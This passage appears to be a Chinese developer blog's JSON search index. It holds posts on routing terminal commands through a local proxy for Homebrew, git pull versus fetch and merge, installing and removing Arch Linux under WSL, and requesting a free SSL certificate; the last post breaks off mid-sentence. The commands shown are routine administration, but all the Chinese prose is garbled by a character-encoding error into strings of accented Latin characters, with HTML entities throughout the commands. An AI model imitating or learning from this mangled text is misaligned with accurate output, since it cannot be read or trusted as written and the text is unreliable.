å¦‚ä½•çŸ¥é“ç»ˆç«¯å‘½ä»¤æœ‰æ²¡æœ‰èµ°ä»£ç†ï¼Ÿ æœ‰ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯é€šè¿‡Curl å‘½ä»¤ï¼š 1curl https:&#x2F;&#x2F;www.google.com å¦‚æœèµ°äº†æœ¬åœ°ä»£ç†ï¼Œé‚£ä¹ˆå¾ˆå¿«ç»ˆç«¯å°±ä¼šæœ‰è¾“å‡ºï¼Œå¦‚æœæ²¡æœ‰èµ°åˆ™ä¼šæç¤º403 ç«¯å£è¯·æ±‚è¶…æ—¶ã€‚ æ°¸ä¹…ç”Ÿæ•ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢çš„é…ç½®ä»…ä»…åªæ˜¯ä¸´æ—¶çš„ï¼Œå¦‚æœé‡å¯ä¸€ä¸‹ç»ˆç«¯ï¼Œè¿™ä¸ªé…ç½®å°±å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•å¯ä»¥æ°¸ä¹…ç”Ÿæ•ˆå‘¢ï¼Ÿ å½“ç„¶æ˜¯æœ‰çš„ï¼Œåªéœ€è¦å°†ç¯å¢ƒå˜é‡å†™å…¥ç»ˆç«¯ä¸­ã€‚ 12345# bashecho export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile# zshecho export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zprofile è¿™æ ·ï¼ŒHomebrew å°±èƒ½é€šè¿‡ Shadowsocks æ¥æ›´æ–°äº†ã€‚ å‚è€ƒé“¾æ¥ è®© Homebrew èµ°ä»£ç†æ›´æ–° å¦‚ä½•è®©Homebrew èµ°ä»£ç†æ›´æ–°ï¼Ÿ","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"Git Pull å‘½ä»¤è¯¦è§£","slug":"detailed-git-pull-command","date":"2020-08-17T15:34:26.000Z","updated":"2020-08-17T15:36:38.472Z","comments":true,"path":"detailed-git-pull-command/","link":"","permalink":"https://www.0x2beace.com/detailed-git-pull-command/","excerpt":"è¿™ç‰‡æ–‡ç« ä¸»è¦ç”¨æ¥è®²è§£git pullå‘½ä»¤çš„ä¸€äº›ç»†èŠ‚ã€‚","text":"è¿™ç‰‡æ–‡ç« ä¸»è¦ç”¨æ¥è®²è§£git pullå‘½ä»¤çš„ä¸€äº›ç»†èŠ‚ã€‚ git pullgit pull çš„ä½œç”¨æ˜¯ï¼šå–å›è¿œç¨‹ä¸»æœºæŸä¸ªåˆ†æ”¯çš„æ›´æ–°ï¼Œå†ä¸æœ¬åœ°æŒ‡å®šåˆ†æ”¯è‡ªåŠ¨åˆå¹¶ã€‚ æè¿°å°†è¿œç¨‹ä¸»æœºä¸­çš„æ›´æ”¹åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹git pullæ˜¯git fetchå‘½ä»¤å’Œgit merge Fetch_HEADå‘½ä»¤çš„åˆé›†ï¼Œåé¢ä¼šè¯¦ç»†ä»‹ç»ã€‚ ç¤ºä¾‹è¿™æ˜¯git pull çš„å®Œæ•´æ ¼å¼ï¼š 1$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;â€¦]] æ¯”å¦‚è¦å–å›originä¸»æœºçš„fixbugåˆ†æ”¯çš„æœ€æ–°æäº¤ï¼Œå¹¶ä¸æœ¬åœ°çš„masteråˆ†æ”¯åˆå¹¶ï¼Œå°±éœ€è¦å†™æˆè¿™ä¸ªæ ·å­ï¼š 1$ git pull origin fixbug:master å¦‚æœè¿œç¨‹åˆ†æ”¯è¦ä¸å½“å‰åˆ†æ”¯åˆå¹¶ï¼Œåˆ™å†’å·åŠå…¶å†’å·åçš„åˆ†æ”¯å¯ä»¥çœç•¥ï¼Œå°±å˜æˆäº†è¿™ä¸ªæ ·å­ï¼š 12&#x2F;&#x2F; å–å›firebug åˆ†æ”¯çš„æœ€æ–°æäº¤å¹¶ä¸å½“å‰åˆ†æ”¯åˆå¹¶$ git pull origin fixbug ä¸Šé¢çš„å‘½ä»¤è¡¨ç¤ºï¼Œå–å›origin/fixbugåˆ†æ”¯æœ€æ–°çš„æäº¤ï¼Œå¹¶äºå½“å‰åˆ†æ”¯åˆå¹¶ã€‚ è¿™é‡Œå°±ç­‰åŒäºå…ˆgit fetchè·å–æ‰€è·Ÿè¸ªçš„è¿œç¨‹åˆ†æ”¯çš„æœ€æ–°çš„æäº¤ï¼Œç„¶åæ‰§è¡Œgit mergeåˆå¹¶åˆ°å½“å‰åˆ†æ”¯ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢ä¸¤æ¡å‘½ä»¤ã€‚ 12345&#x2F;&#x2F; è‡ªåŠ¨ä»å½“å‰åˆ†æ”¯çš„è·Ÿè¸ªåˆ†æ”¯ä¸Šè·å–æœ€æ–°çš„æäº¤$ git fetch &#x2F;&#x2F; åˆå¹¶origin&#x2F;fixbugåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯$ git merge origin&#x2F;fixbug git fetch ä¸ºä»€ä¹ˆè¿™ä¸ªåˆ†æ”¯æ˜¯è¿™ç§å†™æ³•? å› ä¸ºgit fetchå‘½ä»¤ä¼šè·å–å½“å‰è¿½è¸ªåˆ†æ”¯çš„æœ€æ–°æ›´æ”¹ï¼Œå°±ç­‰åŒäºå–å›origin/fixbugåˆ†æ”¯åˆ°æœ¬åœ°ã€‚ ä½ å¯ä»¥ä½¿ç”¨git branch -a æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ª origin/fixbugåˆ†æ”¯ï¼Œå‰ææ˜¯è¯¥åˆ†æ”¯å·²ç»å»ºç«‹äº†è¿½è¸ªå…³ç³»ã€‚ è€Œè¿™ä¸ªåˆ†æ”¯æ‰€åŒ…å«çš„å†…å®¹å°±æ˜¯æœ€æ–°çš„æäº¤æˆ–è€…å…¶ä»–æŸäº›æ›´æ”¹ã€‚æ‰€ä»¥æ­¤æ—¶ä½ éœ€è¦é€šè¿‡åˆå¹¶è¿™ä¸ªé•¿çš„æ¯”è¾ƒå¥‡æ€ªçš„åˆ†æ”¯ï¼Œæ¥æ›´æ–°æœ¬åœ°çš„å·¥ä½œåŒºã€‚ åœ¨æŸäº›åœºåˆï¼ŒGit ä¼šè‡ªåŠ¨åœ¨æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯ä¹‹é—´å»ºç«‹ä¸€ç§è¿½è¸ªå…³ç³»ï¼ˆtrackingï¼‰ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨clone æ—¶ï¼Œä¼šå‘ç°æ‰€æœ‰æœ¬åœ°åˆ†æ”¯é»˜è®¤ä¸è¿œç¨‹ä¸»æœºçš„åŒååˆ†æ”¯ï¼Œå»ºç«‹è¿½è¸ªå…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬åœ°çš„ master åˆ†æ”¯è‡ªåŠ¨è¿½è¸ª origin/masteråˆ†æ”¯ã€‚ Git ä¹Ÿå…è®¸æ‰‹åŠ¨æ·»åŠ è¿½è¸ªå…³ç³»ã€‚ 12&#x2F;&#x2F; æœ¬åœ°masteråˆ†æ”¯ä¸å–å›origin&#x2F;fixbugåˆ†æ”¯å»ºç«‹å…³ç³»ã€‚$ git branch --set-upstream master origin&#x2F;fixbug å¦‚æœå½“å‰åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å­˜åœ¨è¿½è¸ªå…³ç³»ã€‚é‚£ä¹ˆgit pull å°±å¯ä»¥çœç•¥è¿œç¨‹åˆ†æ”¯åã€‚ 1$ git pull origin ä¸Šé¢çš„åˆ†æ”¯æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå°±æ˜¯è¡¨ç¤ºæœ¬åœ°çš„å½“å‰åˆ†æ”¯ä¼šè‡ªåŠ¨ä¸å¯¹åº”çš„originä¸»æœºçš„â€œè¿½è¸ªåˆ†æ”¯â€è¿›è¡Œåˆå¹¶ã€‚ å¦‚æœå½“å‰åˆ†æ”¯åªå¯¹åº”ä¸€ç§è¿½è¸ªåˆ†æ”¯ï¼Œé‚£ä¹ˆè¿œç¨‹ä¸»æœºåéƒ½å¯ä»¥çœç•¥ã€‚ 12&#x2F;&#x2F; è¿™ä¹Ÿå°±æˆäº†æˆ‘ä»¬å¸¸çœ‹è§çš„åŸå§‹å‘½ä»¤ã€‚$ git pull ä¸Šé¢çš„å‘½ä»¤ä¼šè‡ªåŠ¨çš„ä¸å”¯ä¸€çš„è¿½è¸ªåˆ†æ”¯è¿›è¡Œåˆå¹¶ã€‚ å¦‚ä½•å°†è¿œç¨‹åˆ†æ”¯ä½œä¸ºæœ¬åœ°çš„é»˜è®¤åˆ†æ”¯ï¼Ÿ 1$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt; è¿™æ ·å°±å°†è¿œç¨‹çš„åˆ†æ”¯ä¸æœ¬åœ°åŒååˆ†æ”¯å»ºç«‹äº†è¿½è¸ªå…³ç³»ã€‚ å¯ä»¥ä½¿ç”¨git config -eå‘½ä»¤æŸ¥çœ‹ã€‚ å½“è¿½è¸ªå…³ç³»åªæœ‰ä¸€ä¸ªæ—¶ï¼Œé‚£ä¹ˆä½¿ç”¨git pull å‘½ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥æ›´æ–°&lt;remote branch&gt; åˆ†æ”¯äº†ã€‚ å¦‚æœåˆå¹¶éœ€è¦é‡‡ç”¨rebaseæ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨--rebaseé€‰é¡¹ã€‚ git rebase è¿™é‡Œè¯´ä¸€ä¸ªé¢˜å¤–è¯ï¼Œrebase æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆç”¨ï¼Ÿ git rebase æ¸…é™¤æœ¬åœ°å†å²æäº¤ 1$ git --rebase &lt;è¿œç¨‹ä¸»æœºå&gt;&lt;è¿œç¨‹åˆ†æ”¯å&gt;:&lt;æœ¬åœ°åˆ†æ”¯å&gt; git fetch ä¸ git pull çš„åŒºåˆ«ã€‚ git fetch è¡¨ç¤ºä»è¿œç¨‹è·å–æœ€æ–°çš„ç‰ˆæœ¬åˆ°æœ¬åœ°ï¼Œä½†æ˜¯ä¸ä¼šè‡ªåŠ¨åˆå¹¶ã€‚å…¶è¿‡ç¨‹ç”¨å‘½ä»¤è¡¨ç¤ºå°±æ˜¯ï¼š 123$ git fetch origin master$ git log -p master..origin&#x2F;master$ git merge origin&#x2F;master å¦ä¸€ç§å†™æ³•å°±æ˜¯ï¼š 123$ git fetch origin master:tem$ git diff tem$ git merge tem ä¸Šé¢è¿™ä¸¤ç§å†™æ³•éƒ½æ˜¯éƒ½æ˜¯ä¸€ä¸ªæ„æ€ã€‚å”¯ä¸€æœ‰æ‰€åŒºåˆ«çš„å°±æ˜¯ä½¿ç”¨ temåˆ†æ”¯ä»£æ›¿äº†origin/masteråˆ†æ”¯çš„å­˜åœ¨ã€‚å…¶å«ä¹‰æ˜¯ï¼š ä»è¿œç¨‹originä¸»æœºçš„masterä¸»åˆ†æ”¯ä¸‹è½½æœ€æ–°çš„ç‰ˆæœ¬åˆ°æœ¬åœ°origin/masteråˆ†æ”¯ï¼Œæˆ–è€…temåˆ†æ”¯ã€‚ æ¯”è¾ƒæœ¬åœ°masteråˆ†æ”¯ä¸origin/masterï¼ˆtemï¼‰åˆ†æ”¯çš„å·®å¼‚ã€‚ æœ€åè¿›è¡Œåˆå¹¶ git pullï¼Œç›¸å½“äºä»è¿œç¨‹è·å–æœ€æ–°çš„ç‰ˆæœ¬å¹¶åˆå¹¶åˆ°æœ¬åœ°ã€‚ 1$ git pull origin master ä¸Šè¿°å‘½ä»¤å…¶å®ç›¸å½“äºgit fetch å’Œ git mergeåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œgit fetchæ›´å®‰å…¨ä¸€äº›ï¼Œå› ä¸ºåœ¨mergeå‰ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ›´æ–°æƒ…å†µï¼Œç„¶åå†å†³å®šæ˜¯å¦åˆå¹¶ã€‚","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Win10 å¦‚ä½•å¸è½½ Arch Linux","slug":"how-to-uninstall-wsl-linux-subsystem-in-win-10","date":"2020-08-16T09:56:22.000Z","updated":"2020-08-23T02:46:19.997Z","comments":true,"path":"how-to-uninstall-wsl-linux-subsystem-in-win-10/","link":"","permalink":"https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/","excerpt":"æœ€è¿‘åœ¨Windows ä¸Šå®‰è£… WSLï¼Œé‡åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œéœ€è¦å°† Arch Linux å®Œå…¨å¸è½½ã€‚","text":"æœ€è¿‘åœ¨Windows ä¸Šå®‰è£… WSLï¼Œé‡åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œéœ€è¦å°† Arch Linux å®Œå…¨å¸è½½ã€‚ åœ¨æ­£å¼å¸è½½ä¹‹å‰ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ä¸è¦è¯•å›¾é€šè¿‡ Microsoft Store å»å¸è½½ï¼Œé‚£é‡Œåªæœ‰å®‰è£…æŒ‰é’®ï¼Œæ²¡æœ‰å¸è½½æŒ‰é’®ã€‚ ç§‹å­£åˆ›æ„è€…æ›´æ–°ä¹‹å‰ï¼Œå¯ä»¥ä½¿ç”¨lxrunå‘½ä»¤å»è¿›è¡Œå¸è½½æ“ä½œï¼Œä½†æ˜¯ç§‹å­£åˆ›æ„è€…æ›´æ–°ä¹‹åè¯¥å‘½ä»¤å°±è¢«ç§»é™¤äº†ã€‚ æŸ¥çœ‹å‘è¡Œç‰ˆåˆ—å‡ºå½“å‰å·²ç»å®‰è£…ä¸”éšæ—¶å¯ç”¨çš„å‘è¡Œç‰ˆï¼š 1wslconfig &#x2F;list åˆ—å‡ºæ‰€æœ‰å‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬æ­£åœ¨å®‰è£…ã€å¸è½½å’Œå·²æŸåçš„å‘è¡Œç‰ˆï¼š 1wslconfig &#x2F;list &#x2F;all å¸è½½å¸è½½å·²ç»å®‰è£…çš„å‘è¡Œç‰ˆï¼š 12345$ wslconfig &#x2F;list &#x2F;allWindows Subsystem for Linux Distributions:Arch (Default)$ wslconfig &#x2F;unregister ArchUnregistering... ä¸Šé¢æ˜¯ä»¥Arch Linuxä¸ºä¾‹è¿›è¡Œå¸è½½ï¼Œå…¶ä»–å‘è¡Œç‰ˆåŒç†ï¼Œåªéœ€è¦æ›¿æ¢å‘è¡Œç‰ˆçš„åç§°å°±å¯ä»¥äº†ã€‚ æ³¨æ„: å¸è½½å‘è¡Œç‰ˆæ—¶ï¼Œä¼šæ°¸ä¹…åˆ é™¤æ‰€æœ‰ä¸è¯¥å‘è¡Œç‰ˆæœ‰å…³çš„æ•°æ®å’Œè®¾ç½®ã€‚ å‚è€ƒé“¾æ¥ Windows 10 Linuxå­ç³»ç»Ÿå¦‚ä½•å¸è½½ï¼Ÿ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"Win10 å¦‚ä½•å®‰è£… Arch Linux","slug":"how-to-install-arch-linux-on-win10","date":"2020-08-16T09:50:09.000Z","updated":"2020-08-16T10:00:10.873Z","comments":true,"path":"how-to-install-arch-linux-on-win10/","link":"","permalink":"https://www.0x2beace.com/how-to-install-arch-linux-on-win10/","excerpt":"æœ€è¿‘ä¸»åŠ›ç”Ÿäº§å·¥å…·å¯èƒ½è¦æ‹¿å»é€ä¿®ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ä¸€æ®µæ—¶é—´è¦å’Œæˆ‘çš„MBP åˆ†å¼€äº†ã€‚ä½†æ˜¯å·¥ä½œè¿˜æ˜¯è¦ç»§ç»­ï¼Œäºæ˜¯æŠŠä¹‹å‰é—²ç½®çš„ å°ç±³ Pro 15.6 ç»™æ•´èµ·æ¥ã€‚ ç¬¬ä¸€ä»¶éœ€è¦åšçš„äº‹æƒ…å°±æ˜¯é…ç½®å¼€å‘ç¯å¢ƒã€‚","text":"æœ€è¿‘ä¸»åŠ›ç”Ÿäº§å·¥å…·å¯èƒ½è¦æ‹¿å»é€ä¿®ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ä¸€æ®µæ—¶é—´è¦å’Œæˆ‘çš„MBP åˆ†å¼€äº†ã€‚ä½†æ˜¯å·¥ä½œè¿˜æ˜¯è¦ç»§ç»­ï¼Œäºæ˜¯æŠŠä¹‹å‰é—²ç½®çš„ å°ç±³ Pro 15.6 ç»™æ•´èµ·æ¥ã€‚ ç¬¬ä¸€ä»¶éœ€è¦åšçš„äº‹æƒ…å°±æ˜¯é…ç½®å¼€å‘ç¯å¢ƒã€‚ äº†è§£ WSLä»€ä¹ˆæ˜¯ WSL ï¼ŸWindows Linux Server (WSL) åˆåWindows å­ç³»ç»Ÿï¼Œå®ƒä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥ç›´æ¥åœ¨æœªç»ä¿®æ”¹å¾—Windows ä¸Šè¿è¡Œ Gun/Linux ç¯å¢ƒï¼Œä¹ŸåŒ…æ‹¬å¤§å¤šæ•°å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ç”¨ç¨‹åºå‘˜å’Œåº”ç”¨ç¨‹åºå‘˜ï¼Œè€Œä¸ä¼šéœ€è¦é¢å¤–å¢åŠ è™šæ‹Ÿæœºã€‚ WSL å¯ä»¥åšä»€ä¹ˆ ä½ å¯ä»¥è‡ªè¡Œé€‰æ‹©ä½ å–œæ¬¢çš„ Gun/Linux å‘è¡Œç‰ˆï¼šArch Linuxã€Ubuntuã€OpenSuSEã€Kail Linuxã€Debianã€Fedoraç­‰ã€‚ è¿è¡Œé€šç”¨çš„å‘½ä»¤è¡Œï¼Œä¾‹å¦‚grepï¼Œsedï¼Œawkæˆ–å…¶ä»–ELF-64äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è½»æ¾è¿è¡ŒBash Shellè„šæœ¬å’Œ GNU/Linux å‘½ä»¤è¡Œåº”ç”¨ç¨‹åº ä½¿ç”¨è‡ªå·±çš„ GNU/Linux åˆ†å‘ç¨‹åºåŒ…ç®¡ç†å™¨å®‰è£…å…¶ä»–è½¯ä»¶ã€‚ ä½¿ç”¨ç±»ä¼¼Unixçš„å‘½ä»¤è¡Œå¤–å£³è°ƒç”¨Windowsåº”ç”¨ç¨‹åºã€‚ åœ¨Windowsä¸Šè°ƒç”¨ GNU/Linux åº”ç”¨ç¨‹åºã€‚ æœ‰äº†è¿™äº›åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®Œæˆå¾ˆå¤šå·¥ä½œï¼Œè€Œä¸å¿…æ‹…å¿ƒå®‰è£…è™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼Œä»è€Œäº«å—Linuxçš„å¥½å¤„ã€‚å®‰è£…å¹¶å‡†å¤‡å¥½Win 10åï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼Œå¹¶åœ¨å…¶ä¸­æ·»åŠ Arch Linuxã€‚ å®‰è£… WSLæœ¬æ–‡è¦å®‰è£…çš„WSL æ˜¯ Arch Linux ã€‚ ä¸ºä»€ä¹ˆè¦é€‰æ‹© Arch Linuxï¼Ÿ å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªè½»é‡çº§ä¸”çµæ´»çš„Linux å‘è¡Œç‰ˆã€‚ ä¸ºLinux å®‰è£…Windows å­ç³»ç»Ÿè¿™æ˜¯ä¸€é¡¹ä½¿Windowsèƒ½å¤Ÿâ€œ æ‰˜ç®¡ â€ Linux çš„åŠŸèƒ½ã€‚æ‰€ä»¥éœ€è¦å…ˆå¯ç”¨æ­¤åŠŸèƒ½ã€‚ ä»¥ç®¡ç†å‘˜çš„èº«ä»½æ‰“å¼€Power Shellï¼Œç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux é€šå¸¸ä¼šé‡å¯ä¸€æ¬¡ä½ çš„ç”µè„‘ã€‚ å®‰è£…Arch Linuxæˆ‘è®°å¾—åœ¨2019 å¹´ï¼ŒWindows åˆšæ‹¥æŠ± Linux æ—¶ï¼ŒArch Linux è¿˜å¯ä»¥ç›´æ¥ä» Microsoft Store ç›´æ¥ä¸‹è½½ï¼Œä¸çŸ¥ä¸ºä½•ç°åœ¨å´æœä¸åˆ°äº†ã€‚ ä¸è¿‡è¿˜æ˜¯æœ‰å…¶ä»–åŠæ³•æ‰‹åŠ¨å®‰è£…ï¼Œæ‰“å¼€è¯¥é¡µé¢ï¼Œä¸‹è½½Arch.zipã€‚ è§£å‹å®Œæˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ–‡ä»¶ï¼š åŒå‡»Arch.exeåº”ç”¨ç¨‹åºï¼Œè¿›è¡Œå®‰è£…ã€‚ ç¨å¾®ç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°Arch Linux å·²ç»é¡ºåˆ©å®‰è£…å®Œæˆäº†ï¼Œç„¶åæŒ‰ä»»æ„é”®é€€å‡ºã€‚ å¯åŠ¨Arch Linuxå†æ¬¡åŒå‡»Arch Linuxï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œå°±å¯ä»¥çœ‹åˆ°Arch Linux çš„æ§åˆ¶å°äº†ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚ é…ç½®ç¬¬ä¸€æ¬¡å®‰è£…å®Œæˆä¹‹åï¼Œéœ€è¦æ‰‹åŠ¨åšä¸€äº›é…ç½®ï¼Œåˆå§‹åŒ–å¹¶æ›´æ–°ç³»ç»Ÿã€‚ åœ¨ç»ˆç«¯æˆ–CMD ä¸­è¾“å…¥WSL è¿›å…¥Arch Linuxã€‚ ç¼–è¾‘ /etc/pacman.d/mirrorlistï¼Œå»æ‰ChinaèŠ‚ç‚¹ å‰é¢çš„##ï¼Œä»¥åŠä¸‹é¢çš„Serverä¸‹é¢çš„##ã€‚ åˆå§‹åŒ–123pacman-key --initpacman-key --populate archlinux æ›´æ–°12345&#x2F;&#x2F; æ›´æ–° GPG keypacman -Sy archlinux-keyring&#x2F;&#x2F; æ›´æ–°ç³»ç»Ÿï¼Œé€Ÿåº¦å¿«æ…¢ä¸é•œåƒæºæœ‰å…³pacman -Syyu base base-devel ä¸ªæ€§åŒ–Arch Linux é»˜è®¤çš„æ ·å¼å¹¶ä¸å¥½çœ‹ï¼Œå’ŒCMD éƒ½æ˜¯é»‘æ¼†æ¼†çš„ä¸€ç‰‡ã€‚ å› ä¸ºArch Linux é»˜è®¤ä½¿ç”¨çš„ Bashï¼Œå¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œæ›´å–œæ¬¢ Zsh çš„è¯ï¼Œé‚£å°±è¯·ç»§ç»­çœ‹ä¸‹å»ã€‚ å®‰è£…ZSHæ—¢ç„¶è¦å®‰è£…Zshï¼Œé‚£å°±ä¸å¾—ä¸å®‰è£…oh-my-zshäº†ï¼Œæ‰€ä»¥è¿™é‡Œä¸€èµ·å®‰è£…äº†ã€‚ 1pacman -S zsh oh-my-zsh-git å®‰è£…Spaceship ZSHSpaceship ZSH æ˜¯Zsh çš„æç¤ºç¬¦å·¥å…·ã€‚ å…‹éš†ä»“åº“ 1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; é“¾æ¥æ–‡ä»¶ 1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; æ›´æ”¹é»˜è®¤theme 12# vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;spaceship&quot; é‡å¯ç»ˆç«¯å³å¯ã€‚ å‚è€ƒé“¾æ¥ å®‰è£…ArchWSLï¼ˆWindows ä¸‹çš„Arch Linux å­ç³»ç»Ÿï¼‰","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"å¦‚ä½•ç”³è¯·å…è´¹çš„SSL è¯ä¹¦","slug":"how-to-apply-for-a-free-ssl-certificate","date":"2020-08-14T10:03:13.000Z","updated":"2023-02-28T06:42:31.682Z","comments":true,"path":"how-to-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ç”³è¯·å…è´¹çš„ SSL è¯ä¹¦ï¼Œé€šè¿‡æœ¬æ–‡ä»‹ç»çš„æ–¹å¼æ‰€ç”³è¯·çš„è¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œè¯·è°¨æ…é€‰æ‹©ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•å¦‚ä½•ç”³è¯·å…è´¹çš„ SSL è¯ä¹¦ï¼Œé€šè¿‡æœ¬æ–‡ä»‹ç»çš„æ–¹å¼æ‰€ç”³è¯·çš„è¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œè¯·è°¨æ…é€‰æ‹©ã€‚ å‡†å¤‡åƒè¿™ç±»æä¾›å…è´¹ SSL è¯ä¹¦çš„ç½‘ç«™éå¸¸å¤šï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„å¹³å°æ˜¯ FreeSSL.cn ã€‚ åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œä½ å¾—å‡†å¤‡ä¸€ä¸ªé‚®ç®±ï¼Œæ³¨å†Œ ä¸€ä¸ª FreeSSL.cn è´¦å·ï¼Œç„¶åç™»å½•ã€‚ å°†éœ€è¦ç”³è¯·è¯ä¹¦çš„åŸŸåå¡«å†™åœ¨è¾“å…¥æ¡†ä¸­ï¼Œé€‰æ‹©å¤šåŸŸåé€šé…ç¬¦ï¼Œç„¶åç‚¹å‡»åˆ›å»ºå…è´¹çš„SSL è¯ä¹¦ã€‚ æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯æ³›åŸŸåï¼Œæ ¹æ®ä½ è‡ªå·±çš„å®é™…æƒ…å†µï¼Œå»åˆ›å»ºç›¸åº”å­åŸŸåçš„è¯ä¹¦ï¼š example.comï¼šä¸»åŸŸå *.example.comï¼šæ³›åŸŸå é€‰æ‹©æµè§ˆå™¨ç”Ÿæˆã€‚ ç‚¹å‡»ç¡®è®¤åˆ›å»ºã€‚ æ·»åŠ TXT è®°å½•æ‰“å¼€éœ€è¦ç”³è¯· SSL è¯ä¹¦çš„åŸŸåç®¡ç†åå°ï¼Œæ‰¾åˆ° DNS ç®¡ç†ã€‚ æ·»åŠ  TXT éªŒè¯ï¼Œå°†åˆšæ‰çš„è®°å½•å€¼ä¸TXT è®°å½•æ·»åŠ åˆ°å¯¹åº”çš„TXT ç±»å‹ã€‚ æ³¨æ„âš ï¸ï¼šè®°å½•å€¼åŒºåˆ†å¤§å°å†™ã€‚ æ£€æµ‹æ˜¯å¦é…ç½®æˆåŠŸã€‚ åœ¨å®ŒæˆéªŒè¯ä¹‹å‰ä¸è¦ç¦»å¼€å½“å‰é¡µé¢ï¼ŒéªŒè¯æˆåŠŸä¹‹åï¼Œç‚¹å‡»éªŒè¯ã€‚ å¦‚æœé…ç½®æˆåŠŸæ²¡é—®é¢˜ï¼Œå°±å¯ä»¥ç‚¹å‡»éªŒè¯ï¼Œä¸‹è½½è¯ä¹¦å°±å®Œæˆäº†ã€‚ æ³¨æ„âš 